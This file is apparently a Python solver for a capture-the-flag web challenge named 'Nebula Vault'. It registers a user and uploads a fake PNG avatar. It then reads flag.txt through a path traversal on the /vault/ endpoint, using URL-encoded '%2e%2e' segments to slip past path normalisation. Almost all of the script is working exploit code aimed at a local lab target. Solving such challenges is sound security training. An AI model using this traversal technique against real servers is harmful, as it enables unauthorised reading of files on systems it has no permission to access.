#!/usr/bin/env python3
from __future__ import annotations

import argparse
import sys

import requests

# ---------- ANSI ----------
RESET = "\033[0m"
BOLD = "\033[1m"
DIM = "\033[2m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
CYAN = "\033[36m"


def info(msg: str) -> None:
    print(f"{CYAN}{BOLD}[*]{RESET} {msg}", flush=True)


def ok(msg: str) -> None:
    print(f"{GREEN}{BOLD}[+]{RESET} {msg}", flush=True)


def warn(msg: str) -> None:
    print(f"{YELLOW}{BOLD}[!]{RESET} {msg}", flush=True)


def err(msg: str) -> None:
    print(f"{RED}{BOLD}[-]{RESET} {msg}", flush=True)


def must_ok(resp: requests.Response, step: str) -> None:
    if resp.status_code >= 400:
        raise RuntimeError(f"{step} failed: HTTP {resp.status_code}\n{resp.text[:300]}")


def main() -> int:
    ap = argparse.ArgumentParser(description="Nebula Vault solver (full flow + traversal).")
    ap.add_argument("--base", default="http://127.0.0.1:5000", help="Base URL")
    ap.add_argument("--callsign", default="SOLVER-ONE", help="Callsign to register")
    ap.add_argument("--timeout", type=int, default=10, help="HTTP timeout seconds")
    ap.add_argument("--no-avatar-check", action="store_true", help="Skip GET /me/avatar verification")
    args = ap.parse_args()

    base = args.base.rstrip("/")
    s = requests.Session()
    

    info(f"Target: {BOLD}{base}{RESET}")
    info(f"Callsign: {BOLD}{args.callsign}{RESET}")

    # 0) Establish session (creates sid via before_request)
    r = s.get(f"{base}/", timeout=args.timeout)
    must_ok(r, "GET /")

    # 1) Register callsign
    r = s.post(
        f"{base}/register",
        data={"username": args.callsign},
        allow_redirects=True,
        timeout=args.timeout,
    )
    must_ok(r, "POST /register")
    ok("Registered callsign")

    # 2) Upload avatar (required to proceed)
    fake_png = b"\x89PNG\r\n\x1a\n" + b"CTFCTFCTF"
    files = {"avatar": ("avatar.png", fake_png, "image/png")}
    r = s.post(
        f"{base}/upload",
        files=files,
        allow_redirects=True,
        timeout=args.timeout,
    )
    must_ok(r, "POST /upload")
    ok("Uploaded avatar (session-bound, ephemeral)")

    # 3) Verify secure avatar route (proves per-session avatar serving works)
    if not args.no_avatar_check:
        r = s.get(f"{base}/me/avatar", timeout=args.timeout)
        must_ok(r, "GET /me/avatar")
        ct = r.headers.get("Content-Type", "")
        ok(f"Verified /me/avatar: {DIM}{ct}{RESET}")

    # 4) Exploit the intentionally vulnerable vault endpoint.
    # IMPORTANT: Use %2e%2e to avoid client/proxy path normalization.
    exploit_url = f"{base}/vault/%2e%2e/flag.txt"
    info(f"Exploit URL: {DIM}{exploit_url}{RESET}")

    r = s.get(exploit_url, timeout=args.timeout)
    must_ok(r, "GET /vault/%2e%2e/flag.txt")

    flag = r.text.strip()
    ok(f"Flag: {BOLD}{flag}{RESET}")
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except Exception as e:
        err(str(e))
        raise SystemExit(1)